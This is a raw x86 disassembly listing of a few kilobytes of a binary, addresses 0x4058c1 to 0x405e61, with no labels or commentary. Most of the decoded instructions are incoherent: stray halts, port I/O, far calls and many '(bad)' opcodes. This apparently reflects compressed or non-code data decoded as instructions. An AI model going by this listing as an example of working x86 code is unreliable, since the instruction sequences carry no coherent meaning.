  4058c1:	58                   	pop    %eax
  4058c2:	b8 16 36 c4 78       	mov    $0x78c43616,%eax
  4058c7:	b8 a8 fe d8 6b       	mov    $0x6bd8fea8,%eax
  4058cc:	fa                   	cli
  4058cd:	34 36                	xor    $0x36,%al
  4058cf:	1a 0a                	sbb    (%edx),%cl
  4058d1:	ce                   	into
  4058d2:	f4                   	hlt
  4058d3:	66 38 18             	data16 cmp %bl,(%eax)
  4058d6:	3f                   	aas
  4058d7:	fe                   	(bad)
  4058d8:	34 c8                	xor    $0xc8,%al
  4058da:	1e                   	push   %ds
  4058db:	f4                   	hlt
  4058dc:	d8 07                	fadds  (%edi)
  4058de:	d8 b2 54 60 14 68    	fdivs  0x68146054(%edx)
  4058e4:	72 04                	jb     0x4058ea
  4058e6:	01 8b 7f 1c 62 d4    	add    %ecx,-0x2b9de381(%ebx)
  4058ec:	40                   	inc    %eax
  4058ed:	7a 26                	jp     0x405915
  4058ef:	9a 25 0d 33 de 27 8c 	lcall  $0x8c27,$0xde330d25
  4058f6:	58                   	pop    %eax
  4058f7:	38 bd 7f 95 7f 18    	cmp    %bh,0x187f957f(%ebp)
  4058fd:	0e                   	push   %cs
  4058fe:	8b fa                	mov    %edx,%edi
  405900:	96                   	xchg   %eax,%esi
  405901:	c8 fe fb e8          	enter  $0xfbfe,$0xe8
  405905:	79 b8                	jns    0x4058bf
  405907:	a8 fb                	test   $0xfb,%al
  405909:	3a 5e 7d             	cmp    0x7d(%esi),%bl
  40590c:	43                   	inc    %ebx
  40590d:	c9                   	leave
  40590e:	fe                   	(bad)
  40590f:	d5 e7                	aad    $0xe7
  405911:	57                   	push   %edi
  405912:	1d 3d 3d 39 c8       	sbb    $0xc8393d3d,%eax
  405917:	b7 af                	mov    $0xaf,%bh
  405919:	e3 cb                	jecxz  0x4058e6
  40591b:	3a 9f 5f b5 8f 44    	cmp    0x448fb55f(%edi),%bl
  405921:	c7                   	(bad)
  405922:	be 8e 57 cc 76       	mov    $0x76cc578e,%esi
  405927:	77 20                	ja     0x405949
  405929:	78 f5                	js     0x405920
  40592b:	f9                   	stc
  40592c:	55                   	push   %ebp
  40592d:	45                   	inc    %ebp
  40592e:	cd b2                	int    $0xb2
  405930:	df 81 f8 eb 00 d8    	filds  -0x27ff1408(%ecx)
  405936:	d7                   	xlat   %ds:(%ebx)
  405937:	f1                   	int1
  405938:	ee                   	out    %al,(%dx)
  405939:	ce                   	into
  40593a:	ee                   	out    %al,(%dx)
  40593b:	50                   	push   %eax
  40593c:	01 9f 81 a9 fb 44    	add    %ebx,0x44fba981(%edi)
  405942:	2e 83 c8 0f          	cs or  $0xf,%eax
  405946:	34 d2                	xor    $0xd2,%al
  405948:	21 b1 1f fd 91 40    	and    %esi,0x4091fd1f(%ecx)
  40594e:	46                   	inc    %esi
  40594f:	20 0e                	and    %cl,(%esi)
  405951:	14 5e                	adc    $0x5e,%al
  405953:	1b 00                	sbb    (%eax),%eax
  405955:	3c 91                	cmp    $0x91,%al
  405957:	3a cf                	cmp    %bh,%cl
  405959:	80 8f 44 2b 5e 66 10 	orb    $0x10,0x665e2b44(%edi)
  405960:	ec                   	in     (%dx),%al
  405961:	58                   	pop    %eax
  405962:	1b 8e 5e 1c be 49    	sbb    0x49be1c5e(%esi),%ecx
  405968:	e3 e8                	jecxz  0x405952
  40596a:	48                   	dec    %eax
  40596b:	35 39 a2 16 cf       	xor    $0xcf16a239,%eax
  405970:	1d 46 68 8a 61       	sbb    $0x618a6846,%eax
  405975:	86 a8 9b 1e 44 2d    	xchg   %ch,0x2d441e9b(%eax)
  40597b:	a8 9b                	test   $0x9b,%al
  40597d:	60                   	pusha
  40597e:	23 54 6a 7c          	and    0x7c(%edx,%ebp,2),%edx
  405982:	0b b6 2f f2 b9 2c    	or     0x2cb9f22f(%esi),%esi
  405988:	70 35                	jo     0x4059bf
  40598a:	f7 13                	notl   (%ebx)
  40598c:	99                   	cltd
  40598d:	53                   	push   %ebx
  40598e:	aa                   	stos   %al,%es:(%edi)
  40598f:	75 a1                	jne    0x405932
  405991:	1d 2a 34 6c ec       	sbb    $0xec6c342a,%eax
  405996:	17                   	pop    %ss
  405997:	cf                   	iret
  405998:	b5 0a                	mov    $0xa,%ch
  40599a:	1f                   	pop    %ds
  40599b:	3c 85                	cmp    $0x85,%al
  40599d:	6d                   	insl   (%dx),%es:(%edi)
  40599e:	b1 b3                	mov    $0xb3,%cl
  4059a0:	06                   	push   %es
  4059a1:	fc                   	cld
  4059a2:	58                   	pop    %eax
  4059a3:	98                   	cwtl
  4059a4:	23 6d f7             	and    -0x9(%ebp),%ebp
  4059a7:	1d 24 7c 93 4d       	sbb    $0x4d937c24,%eax
  4059ac:	44                   	inc    %esp
  4059ad:	cc                   	int3
  4059ae:	e7 33                	out    %eax,$0x33
  4059b0:	f4                   	hlt
  4059b1:	20 4e 70             	and    %cl,0x70(%esi)
  4059b4:	78 83                	js     0x405939
  4059b6:	54                   	push   %esp
  4059b7:	18 07                	sbb    %al,(%edi)
  4059b9:	0e                   	push   %cs
  4059ba:	85 ea                	test   %ebp,%edx
  4059bc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4059bd:	04 07                	add    $0x7,%al
  4059bf:	10 24 bc             	adc    %ah,(%esp,%edi,4)
  4059c2:	5a                   	pop    %edx
  4059c3:	61                   	popa
  4059c4:	98                   	cwtl
  4059c5:	02 a3 3b c7 1d e0    	add    -0x1fe238c5(%ebx),%ah
  4059cb:	cf                   	iret
  4059cc:	8f                   	(bad)
  4059cd:	fb                   	sti
  4059ce:	4c                   	dec    %esp
  4059cf:	ed                   	in     (%dx),%eax
  4059d0:	1e                   	push   %ds
  4059d1:	48                   	dec    %eax
  4059d2:	a0 00 13 61 74       	mov    0x74611300,%al
  4059d7:	0f 93 64 bc 01       	setae  0x1(%esp,%edi,4)
  4059dc:	f6 bf 05 5b 7f 4f    	idivb  0x4f7f5b05(%edi)
  4059e2:	a9 73 27 e2 d5       	test   $0xd5e22773,%eax
  4059e7:	e7 40                	out    %eax,$0x40
  4059e9:	d1 66 ab             	shll   $1,-0x55(%esi)
  4059ec:	8f                   	(bad)
  4059ed:	ef                   	out    %eax,(%dx)
  4059ee:	5e                   	pop    %esi
  4059ef:	3b f8                	cmp    %eax,%edi
  4059f1:	ee                   	out    %al,(%dx)
  4059f2:	7d c6                	jge    0x4059ba
  4059f4:	d2 a2 3d df 7d bc    	shlb   %cl,-0x438220c3(%edx)
  4059fa:	fa                   	cli
  4059fb:	d3 de                	rcr    %cl,%esi
  4059fd:	fb                   	sti
  4059fe:	8e 57 1f             	mov    0x1f(%edi),%ss
  405a01:	3c d5                	cmp    $0xd5,%al
  405a03:	1a 29                	sbb    (%ecx),%ch
  405a05:	b5 8e                	mov    $0x8e,%ch
  405a07:	f6 41 39 76          	testb  $0x76,0x39(%ecx)
  405a0b:	06                   	push   %es
  405a0c:	00 f3                	add    %dh,%bl
  405a0e:	87 08                	xchg   %ecx,(%eax)
  405a10:	6c                   	insb   (%dx),%es:(%edi)
  405a11:	1a 7b bc             	sbb    -0x44(%ebx),%bh
  405a14:	8c 10                	mov    %ss,(%eax)
  405a16:	27                   	daa
  405a17:	4c                   	dec    %esp
  405a18:	04 42                	add    $0x42,%al
  405a1a:	27                   	daa
  405a1b:	1a ce                	sbb    %dh,%cl
  405a1d:	e2 f5                	loop   0x405a14
  405a1f:	37                   	aaa
  405a20:	91                   	xchg   %eax,%ecx
  405a21:	38 8e 4c 7f 41 54    	cmp    %cl,0x54417f4c(%esi)
  405a27:	9d                   	popf
  405a28:	66 e1 58             	data16 loope 0x405a83
  405a2b:	00 61 66             	add    %ah,0x66(%ecx)
  405a2e:	91                   	xchg   %eax,%ecx
  405a2f:	33 14 fc             	xor    (%esp,%edi,8),%edx
  405a32:	8b f5                	mov    %ebp,%esi
  405a34:	04 a1                	add    $0xa1,%al
  405a36:	60                   	pusha
  405a37:	17                   	pop    %ss
  405a38:	99                   	cltd
  405a39:	44                   	inc    %esp
  405a3a:	89 2c 10             	mov    %ebp,(%eax,%edx,1)
  405a3d:	35 3a 2c ff d4       	xor    $0xd4ff2c3a,%eax
  405a42:	1c c3                	sbb    $0xc3,%al
  405a44:	61                   	popa
  405a45:	86 31                	xchg   %dh,(%ecx)
  405a47:	d5 fd                	aad    $0xfd
  405a49:	6b 0c 07 49          	imul   $0x49,(%edi,%eax,1),%ecx
  405a4d:	e6 54                	out    %al,$0x54
  405a4f:	87 3b                	xchg   %edi,(%ebx)
  405a51:	e3 59                	jecxz  0x405aac
  405a53:	26 f2 27             	es repnz daa
  405a56:	54                   	push   %esp
  405a57:	1e                   	push   %ds
  405a58:	ec                   	in     (%dx),%al
  405a59:	6b bb d0 c0 2f 04 04 	imul   $0x4,0x42fc0d0(%ebx),%edi
  405a60:	ff 04 08             	incl   (%eax,%ecx,1)
  405a63:	2d 5a 44 b4 08       	sub    $0x8b4445a,%eax
  405a68:	20 2f                	and    %ch,(%edi)
  405a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  405a6b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a6c:	3e 46                	ds inc %esi
  405a6e:	f4                   	hlt
  405a6f:	1b 9d 08 ae e4 fe    	sbb    -0x11b51f8(%ebp),%ebx
  405a75:	7d 9d                	jge    0x405a14
  405a77:	80 2f 1a             	subb   $0x1a,(%edi)
  405a7a:	36 0a d9             	ss or  %cl,%bl
  405a7d:	85 3b                	test   %edi,(%ebx)
  405a7f:	de 0d dd 78 23 0c    	fimuls 0xc2378dd
  405a85:	42                   	inc    %edx
  405a86:	e3 0e                	jecxz  0x405a96
  405a88:	08 44 b2 bc          	or     %al,-0x44(%edx,%esi,4)
  405a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  405a8d:	98                   	cwtl
  405a8e:	01 44 eb 9e          	add    %eax,-0x62(%ebx,%ebp,8)
  405a92:	55                   	push   %ebp
  405a93:	cd 7d                	int    $0x7d
  405a95:	e5 35                	in     $0x35,%eax
  405a97:	08 4c 23 c8          	or     %cl,-0x38(%ebx,%eiz,1)
  405a9b:	5d                   	pop    %ebp
  405a9c:	13 cb                	adc    %ebx,%ecx
  405a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  405a9f:	e3 7f                	jecxz  0x405b20
  405aa1:	2c 27                	sub    $0x27,%al
  405aa3:	6c                   	insb   (%dx),%es:(%edi)
  405aa4:	40                   	inc    %eax
  405aa5:	d2 6e 92             	shrb   %cl,-0x6e(%esi)
  405aa8:	4e                   	dec    %esi
  405aa9:	59                   	pop    %ecx
  405aaa:	f1                   	int1
  405aab:	e3 78                	jecxz  0x405b25
  405aad:	04 34                	add    $0x34,%al
  405aaf:	fd                   	std
  405ab0:	ee                   	out    %al,(%dx)
  405ab1:	69 cc 80 04 e1 55    	imul   $0x55e10480,%esp,%ecx
  405ab7:	5c                   	pop    %esp
  405ab8:	73 44                	jae    0x405afe
  405aba:	53                   	push   %ebx
  405abb:	81 07 2b d0 2e b8    	addl   $0xb82ed02b,(%edi)
  405ac1:	4d                   	dec    %ebp
  405ac2:	09 40 0b             	or     %eax,0xb(%eax)
  405ac5:	05 1c c2 10 bd       	add    $0xbd10c21c,%eax
  405aca:	00 ef                	add    %ch,%bh
  405acc:	6e                   	outsb  %ds:(%esi),(%dx)
  405acd:	8c f7                	mov    %?,%edi
  405acf:	5f                   	pop    %edi
  405ad0:	20 25 58 17 a4 fb    	and    %ah,0xfba41758
  405ad6:	fe                   	(bad)
  405ad7:	9a 07 f9 d3 be a0 9d 	lcall  $0x9da0,$0xbed3f907
  405ade:	a8 53                	test   $0x53,%al
  405ae0:	0a 00                	or     (%eax),%al
  405ae2:	e1 92                	loope  0x405a76
  405ae4:	5f                   	pop    %edi
  405ae5:	78 05                	js     0x405aec
  405ae7:	03 94 eb 18 82 bb fe 	add    -0x1447de8(%ebx,%ebp,8),%edx
  405aee:	74 f8                	je     0x405ae8
  405af0:	52                   	push   %edx
  405af1:	32 33                	xor    (%ebx),%dh
  405af3:	4e                   	dec    %esi
  405af4:	17                   	pop    %ss
  405af5:	c1 85 6f 57 68 98 f7 	roll   $0xf7,-0x6797a891(%ebp)
  405afc:	01 3c 5a             	add    %edi,(%edx,%ebx,2)
  405aff:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b00:	1d 27 e5 d2 a2       	sbb    $0xa2d2e527,%eax
  405b05:	13 6c 2c 2c          	adc    0x2c(%esp,%ebp,1),%ebp
  405b09:	38 c5                	cmp    %al,%ch
  405b0b:	80 11 fe             	adcb   $0xfe,(%ecx)
  405b0e:	fe 03                	incb   (%ebx)
  405b10:	89 41 46             	mov    %eax,0x46(%ecx)
  405b13:	28 5d fb             	sub    %bl,-0x5(%ebp)
  405b16:	5a                   	pop    %edx
  405b17:	36 08 74 a7 cd       	or     %dh,%ss:-0x33(%edi,%eiz,4)
  405b1c:	68 2c 8b a6 37       	push   $0x37a68b2c
  405b21:	83 1c dd 28 c3 d1 bf 	sbbl   $0xa,-0x402e3cd8(,%ebx,8)
  405b28:	0a 
  405b29:	08 98 0a 13 fa 12    	or     %bl,0x12fa130a(%eax)
  405b2f:	33 0d 45 0b 1c bf    	xor    0xbf1c0b45,%ecx
  405b35:	75 7c                	jne    0x405bb3
  405b37:	00 1e                	add    %bl,(%esi)
  405b39:	f1                   	int1
  405b3a:	a8 da                	test   $0xda,%al
  405b3c:	20 38                	and    %bh,(%eax)
  405b3e:	0a fc                	or     %ah,%bh
  405b40:	63 e2                	arpl   %esp,%edx
  405b42:	5f                   	pop    %edi
  405b43:	68 3c 59 28 04       	push   $0x428593c
  405b48:	e2 ec                	loop   0x405b36
  405b4a:	99                   	cltd
  405b4b:	aa                   	stos   %al,%es:(%edi)
  405b4c:	a0 14 f6 02 74       	mov    0x7402f614,%al
  405b51:	d6                   	salc
  405b52:	36 63 8f d7 29 66 75 	arpl   %ecx,%ss:0x756629d7(%edi)
  405b59:	00 28                	add    %ch,(%eax)
  405b5b:	7a e7                	jp     0x405b44
  405b5d:	40                   	inc    %eax
  405b5e:	e6 9a                	out    %al,$0x9a
  405b60:	66 6a 5f             	pushw  $0x5f
  405b63:	88 fa                	mov    %bh,%dl
  405b65:	11 86 50 04 05 23    	adc    %eax,0x23050450(%esi)
  405b6b:	6d                   	insl   (%dx),%es:(%edi)
  405b6c:	0a ca                	or     %dl,%cl
  405b6e:	24 0d                	and    $0xd,%al
  405b70:	0e                   	push   %cs
  405b71:	51                   	push   %ecx
  405b72:	2f                   	das
  405b73:	92                   	xchg   %eax,%edx
  405b74:	8e 78 74             	mov    0x74(%eax),%?
  405b77:	a2 e2 00 c6 64       	mov    %al,0x64c600e2
  405b7c:	ed                   	in     (%dx),%eax
  405b7d:	71 7a                	jno    0x405bf9
  405b7f:	56                   	push   %esi
  405b80:	4b                   	dec    %ebx
  405b81:	8b 8e dc 44 34 33    	mov    0x333444dc(%esi),%ecx
  405b87:	ca e0 b8             	lret   $0xb8e0
  405b8a:	fb                   	sti
  405b8b:	33 1a                	xor    (%edx),%ebx
  405b8d:	b9 ee 50 52 16       	mov    $0x165250ee,%ecx
  405b92:	1b 07                	sbb    (%edi),%eax
  405b94:	a1 1c 5a 23 27       	mov    0x27235a1c,%eax
  405b99:	cf                   	iret
  405b9a:	59                   	pop    %ecx
  405b9b:	68 70 0a 25 5c       	push   $0x5c250a70
  405ba0:	d0 6e 1d             	shrb   $1,0x1d(%esi)
  405ba3:	e8 db 1c 80 47       	call   0x47c07883
  405ba8:	e7 c7                	out    %eax,$0xc7
  405baa:	af                   	scas   %es:(%edi),%eax
  405bab:	e9 01 cc f0 22       	jmp    0x233127b1
  405bb0:	5a                   	pop    %edx
  405bb1:	46                   	inc    %esi
  405bb2:	31 10                	xor    %edx,(%eax)
  405bb4:	64 2c ba             	fs sub $0xba,%al
  405bb7:	47                   	inc    %edi
  405bb8:	80 51 0c ba          	adcb   $0xba,0xc(%ecx)
  405bbc:	44                   	inc    %esp
  405bbd:	20 e7                	and    %ah,%bh
  405bbf:	4c                   	dec    %esp
  405bc0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405bc1:	96                   	xchg   %eax,%esi
  405bc2:	a3 14 a0 05 00       	mov    %eax,0x5a014
  405bc7:	0b 05 26 0c 65 71    	or     0x71650c26,%eax
  405bcd:	20 27                	and    %ah,(%edi)
  405bcf:	17                   	pop    %ss
  405bd0:	0b 5c 0c 41          	or     0x41(%esp,%ecx,1),%ebx
  405bd4:	d2 fd                	sar    %cl,%ch
  405bd6:	c7                   	(bad)
  405bd7:	74 6b                	je     0x405c44
  405bd9:	09 4f 35             	or     %ecx,0x35(%edi)
  405bdc:	fc                   	cld
  405bdd:	77 06                	ja     0x405be5
  405bdf:	18 f9                	sbb    %bh,%cl
  405be1:	8e 00                	mov    (%eax),%es
  405be3:	fd                   	std
  405be4:	3d 1e 01 01 0f       	cmp    $0xf01011e,%eax
  405be9:	04 b5                	add    $0xb5,%al
  405beb:	54                   	push   %esp
  405bec:	0a 1c 0d b4 69 4b d2 	or     -0x2db4964c(,%ecx,1),%bl
  405bf3:	70 46                	jo     0x405c3b
  405bf5:	be 5c 01 a7 6a       	mov    $0x6aa7015c,%esi
  405bfa:	d7                   	xlat   %ds:(%ebx)
  405bfb:	36 39 ed             	ss cmp %ebp,%ebp
  405bfe:	b0 bc                	mov    $0xbc,%al
  405c00:	20 4d 5d             	and    %cl,0x5d(%ebp)
  405c03:	43                   	inc    %ebx
  405c04:	ed                   	in     (%dx),%eax
  405c05:	36 95                	ss xchg %eax,%ebp
  405c07:	9c                   	pushf
  405c08:	17                   	pop    %ss
  405c09:	24 b5                	and    $0xb5,%al
  405c0b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c0c:	12 d5                	adc    %ch,%dl
  405c0e:	0d f9 00 02 d3       	or     $0xd30200f9,%eax
  405c13:	fb                   	sti
  405c14:	3d 1c 3d 15 88       	cmp    $0x88153d1c,%eax
  405c19:	be 9e 74 26 fb       	mov    $0xfb26749e,%esi
  405c1e:	c8 af 50 77          	enter  $0x50af,$0x77
  405c22:	71 29                	jno    0x405c4d
  405c24:	99                   	cltd
  405c25:	34 7a                	xor    $0x7a,%al
  405c27:	36 30 1e             	xor    %bl,%ss:(%esi)
  405c2a:	90                   	nop
  405c2b:	51                   	push   %ecx
  405c2c:	b2 8c                	mov    $0x8c,%dl
  405c2e:	62 8d 16 9f 6d 8e    	bound  %ecx,-0x719260ea(%ebp)
  405c34:	4c                   	dec    %esp
  405c35:	3e fa                	ds cli
  405c37:	45                   	inc    %ebp
  405c38:	b9 c0 46 25 fd       	mov    $0xfd2546c0,%ecx
  405c3d:	02 59 a6             	add    -0x5a(%ecx),%bl
  405c40:	0b 63 26             	or     0x26(%ebx),%esp
  405c43:	cb                   	lret
  405c44:	b9 18 d6 d3 33       	mov    $0x33d3d618,%ecx
  405c49:	c4 1a                	les    (%edx),%ebx
  405c4b:	4c                   	dec    %esp
  405c4c:	69 a9 8e 78 eb fc 13 	imul   $0x73094c13,-0x3148772(%ecx),%ebp
  405c53:	4c 09 73 
  405c56:	1e                   	push   %ds
  405c57:	2b 08                	sub    (%eax),%ecx
  405c59:	14 14                	adc    $0x14,%al
  405c5b:	9a d8 63 ac 5a 1c df 	lcall  $0xdf1c,$0x5aac63d8
  405c62:	65 1c c5             	gs sbb $0xc5,%al
  405c65:	15 54 57 12 38       	adc    $0x38125754,%eax
  405c6a:	0d 01 fb d9 04       	or     $0x4d9fb01,%eax
  405c6f:	98                   	cwtl
  405c70:	e9 ec d8 d2 26       	jmp    0x27133561
  405c75:	9d                   	popf
  405c76:	7f e3                	jg     0x405c5b
  405c78:	60                   	pusha
  405c79:	16                   	push   %ss
  405c7a:	7f 49                	jg     0x405cc5
  405c7c:	e6 08                	out    %al,$0x8
  405c7e:	80 d9 71             	sbb    $0x71,%cl
  405c81:	03 70 df             	add    -0x21(%eax),%esi
  405c84:	b1 2e                	mov    $0x2e,%cl
  405c86:	3c f0                	cmp    $0xf0,%al
  405c88:	2e b0 91             	cs mov $0x91,%al
  405c8b:	19 a4 fc 22 42 2b 1e 	sbb    %esp,0x1e2b4222(%esp,%edi,8)
  405c92:	61                   	popa
  405c93:	71 de                	jno    0x405c73
  405c95:	d3 78 9a             	sarl   %cl,-0x66(%eax)
  405c98:	78 92                	js     0x405c2c
  405c9a:	f7 34 85 03 73 8d 5a 	divl   0x5a8d7303(,%eax,4)
  405ca1:	16                   	push   %ss
  405ca2:	70 db                	jo     0x405c7f
  405ca4:	36 40                	ss inc %eax
  405ca6:	fd                   	std
  405ca7:	f3 75 28             	repz jne 0x405cd2
  405caa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405cab:	50                   	push   %eax
  405cac:	18 4c 30 ef          	sbb    %cl,-0x11(%eax,%esi,1)
  405cb0:	5c                   	pop    %esp
  405cb1:	3a b4 ac 79 3e 64 64 	cmp    0x64643e79(%esp,%ebp,4),%dh
  405cb8:	ba d3 64 27 5e       	mov    $0x5e2764d3,%edx
  405cbd:	05 71 ec 87 50       	add    $0x5087ec71,%eax
  405cc2:	e7 58                	out    %eax,$0x58
  405cc4:	75 b7                	jne    0x405c7d
  405cc6:	86 20                	xchg   %ah,(%eax)
  405cc8:	6c                   	insb   (%dx),%es:(%edi)
  405cc9:	60                   	pusha
  405cca:	d2 68 08             	shrb   %cl,0x8(%eax)
  405ccd:	02 71 6c             	add    0x6c(%ecx),%dh
  405cd0:	a1 5f 05 26 6c       	mov    0x6c26055f,%eax
  405cd5:	6c                   	insb   (%dx),%es:(%edi)
  405cd6:	b8 f4 a2 6b 43       	mov    $0x436ba2f4,%eax
  405cdb:	cb                   	lret
  405cdc:	65 08 43 0b          	or     %al,%gs:0xb(%ebx)
  405ce0:	31 b2 7c 5d a2 64    	xor    %esi,0x64a25d7c(%edx)
  405ce6:	3e 71 16             	jno,pt 0x405cff
  405ce9:	c7 c6 31 2f 32 74    	mov    $0x74322f31,%esi
  405cef:	92                   	xchg   %eax,%edx
  405cf0:	7c 04                	jl     0x405cf6
  405cf2:	12 39                	adc    (%ecx),%bh
  405cf4:	08 cc                	or     %cl,%ah
  405cf6:	4d                   	dec    %ebp
  405cf7:	4c                   	dec    %esp
  405cf8:	16                   	push   %ss
  405cf9:	f1                   	int1
  405cfa:	69 4e 07 07 3f a2 16 	imul   $0x16a23f07,0x7(%esi),%ecx
  405d01:	92                   	xchg   %eax,%edx
  405d02:	4d                   	dec    %ebp
  405d03:	2c 1c                	sub    $0x1c,%al
  405d05:	c6                   	(bad)
  405d06:	51                   	push   %ecx
  405d07:	e8 34 1c 0c fc       	call   0xfc4c7940
  405d0c:	89 4e 32             	mov    %ecx,0x32(%esi)
  405d0f:	0c 40                	or     $0x40,%al
  405d11:	f6 54 b7 5e          	notb   0x5e(%edi,%esi,4)
  405d15:	64 2e 02 1d 8d 0b dc 	fs add %cs:0x65dc0b8d,%bl
  405d1c:	65 
  405d1d:	1a 2b                	sbb    (%ebx),%ch
  405d1f:	ea fe ee a4 6c 92 f5 	ljmp   $0xf592,$0x6ca4eefe
  405d26:	6b c6 8b             	imul   $0xffffff8b,%esi,%eax
  405d29:	90                   	nop
  405d2a:	0a 3c 41             	or     (%ecx,%eax,2),%bh
  405d2d:	78 96                	js     0x405cc5
  405d2f:	10 04 6a             	adc    %al,(%edx,%ebp,2)
  405d32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405d33:	e8 02 8e 14 fe       	call   0xfe54eb3a
  405d38:	63 e6                	arpl   %esp,%esi
  405d3a:	fe                   	(bad)
  405d3b:	5e                   	pop    %esi
  405d3c:	f4                   	hlt
  405d3d:	69 ab 80 16 d3 c9 64 	imul   $0xed9ade64,-0x362ce980(%ebx),%ebp
  405d44:	de 9a ed 
  405d47:	d8 e8                	fsubr  %st(0),%st
  405d49:	0a 30                	or     (%eax),%dh
  405d4b:	ce                   	into
  405d4c:	93                   	xchg   %eax,%ebx
  405d4d:	ed                   	in     (%dx),%eax
  405d4e:	0c 23                	or     $0x23,%al
  405d50:	35 cd 76 2e 94       	xor    $0x942e76cd,%eax
  405d55:	da 85 46 1a 30 db    	fiaddl -0x24cfe5ba(%ebp)
  405d5b:	9a 86 5a ea fc cd 93 	lcall  $0x93cd,$0xfcea5a86
  405d62:	48                   	dec    %eax
  405d63:	3f                   	aas
  405d64:	23 b7 2e a5 ef 80    	and    -0x7f105ad2(%edi),%esi
  405d6a:	de 34 94             	fidivs (%esp,%edx,4)
  405d6d:	ec                   	in     (%dx),%al
  405d6e:	37                   	aaa
  405d6f:	3b 7b 1b             	cmp    0x1b(%ebx),%edi
  405d72:	1b 52 8e             	sbb    -0x72(%edx),%edx
  405d75:	4c                   	dec    %esp
  405d76:	52                   	push   %edx
  405d77:	c3                   	ret
  405d78:	29 83 4a b6 32 79    	sub    %eax,0x7932b64a(%ebx)
  405d7e:	54                   	push   %esp
  405d7f:	c3                   	ret
  405d80:	6c                   	insb   (%dx),%es:(%edi)
  405d81:	78 03                	js     0x405d86
  405d83:	29 58 13             	sub    %ebx,0x13(%eax)
  405d86:	d8 46 0b             	fadds  0xb(%esi)
  405d89:	12 fe                	adc    %dh,%bh
  405d8b:	48                   	dec    %eax
  405d8c:	72 5e                	jb     0x405dec
  405d8e:	5c                   	pop    %esp
  405d8f:	20 e3                	and    %ah,%bl
  405d91:	a1 6a 0d 62 99       	mov    0x99620d6a,%eax
  405d96:	8d                   	lea    (bad),%ebp
  405d97:	ee                   	out    %al,(%dx)
  405d98:	32 0a                	xor    (%edx),%cl
  405d9a:	c0 5c 57 98 0e       	rcrb   $0xe,-0x68(%edi,%edx,2)
  405d9f:	51                   	push   %ecx
  405da0:	48                   	dec    %eax
  405da1:	18 1c 70             	sbb    %bl,(%eax,%esi,2)
  405da4:	b0 76                	mov    $0x76,%al
  405da6:	b1 dc                	mov    $0xdc,%cl
  405da8:	88 a4 8e 52 6e 52 fa 	mov    %ah,-0x5ad91ae(%esi,%ecx,4)
  405daf:	3d e3 79 92 a2       	cmp    $0xa29279e3,%eax
  405db4:	74 38                	je     0x405dee
  405db6:	2b 62 b5             	sub    -0x4b(%edx),%esp
  405db9:	2b 8f 38 da 73 3a    	sub    0x3a73da38(%edi),%ecx
  405dbf:	77 07                	ja     0x405dc8
  405dc1:	36 84 bc 5b f6 7e 74 	test   %bh,%ss:0x7e747ef6(%ebx,%ebx,2)
  405dc8:	7e 
  405dc9:	96                   	xchg   %eax,%esi
  405dca:	60                   	pusha
  405dcb:	60                   	pusha
  405dcc:	60                   	pusha
  405dcd:	16                   	push   %ss
  405dce:	bc 77 7e 1e 84       	mov    $0x841e7e77,%esp
  405dd3:	7b e4                	jnp    0x405db9
  405dd5:	5c                   	pop    %esp
  405dd6:	6f                   	outsl  %ds:(%esi),(%dx)
  405dd7:	18 03                	sbb    %al,(%ebx)
  405dd9:	92                   	xchg   %eax,%edx
  405dda:	8e 93 1c 31 a0 45    	mov    0x45a0311c(%ebx),%ss
  405de0:	1d 34 01 42 ad       	sbb    $0xad420134,%eax
  405de5:	fe                   	(bad)
  405de6:	26 8e 01             	mov    %es:(%ecx),%es
  405de9:	c9                   	leave
  405dea:	30 14 1b             	xor    %dl,(%ebx,%ebx,1)
  405ded:	2d a8 1e 28 2c       	sub    $0x2c281ea8,%eax
  405df2:	90                   	nop
  405df3:	91                   	xchg   %eax,%ecx
  405df4:	34 74                	xor    $0x74,%al
  405df6:	2d 72 cb a3 3c       	sub    $0x3ca3cb72,%eax
  405dfb:	0c 00                	or     $0x0,%al
  405dfd:	1d 47 cf 88 8a       	sbb    $0x8a88cf47,%eax
  405e02:	10 c8                	adc    %cl,%al
  405e04:	47                   	inc    %edi
  405e05:	14 9e                	adc    $0x9e,%al
  405e07:	fc                   	cld
  405e08:	fb                   	sti
  405e09:	eb ec                	jmp    0x405df7
  405e0b:	dc 39                	fdivrl (%ecx)
  405e0d:	16                   	push   %ss
  405e0e:	9b                   	fwait
  405e0f:	25 fe 35 10 04       	and    $0x41035fe,%eax
  405e14:	bb e0 7c 55 74       	mov    $0x74557ce0,%ebx
  405e19:	1c f2                	sbb    $0xf2,%al
  405e1b:	dd c5                	ffree  %st(5)
  405e1d:	79 07                	jns    0x405e26
  405e1f:	34 f2                	xor    $0xf2,%al
  405e21:	d8 16                	fcoms  (%esi)
  405e23:	f5                   	cmc
  405e24:	a3 0a 71 c4 fe       	mov    %eax,0xfec4710a
  405e29:	6c                   	insb   (%dx),%es:(%edi)
  405e2a:	c7                   	(bad)
  405e2b:	08 be 38 04 49 59    	or     %bh,0x59490438(%esi)
  405e31:	30 a7 2d d8 cd cb    	xor    %ah,-0x343227d3(%edi)
  405e37:	8e 61 c8             	mov    -0x38(%ecx),%fs
  405e3a:	3f                   	aas
  405e3b:	d9 8b d8 da f5 03    	(bad) 0x3f5dad8(%ebx)
  405e41:	6e                   	outsb  %ds:(%esi),(%dx)
  405e42:	2f                   	das
  405e43:	92                   	xchg   %eax,%edx
  405e44:	cd 10                	int    $0x10
  405e46:	30 c4                	xor    %al,%ah
  405e48:	d4 17                	aam    $0x17
  405e4a:	fb                   	sti
  405e4b:	e9 b4 a4 3a ce       	jmp    0xce7b0304
  405e50:	61                   	popa
  405e51:	2f                   	das
  405e52:	34 93                	xor    $0x93,%al
  405e54:	fb                   	sti
  405e55:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e56:	04 2a                	add    $0x2a,%al
  405e58:	d3 a2 5a 04 04 2d    	shll   %cl,0x2d04045a(%edx)
  405e5e:	1c e7                	sbb    $0xe7,%al
  405e60:	6f                   	outsl  %ds:(%esi),(%dx)
  405e61:	fb                   	sti
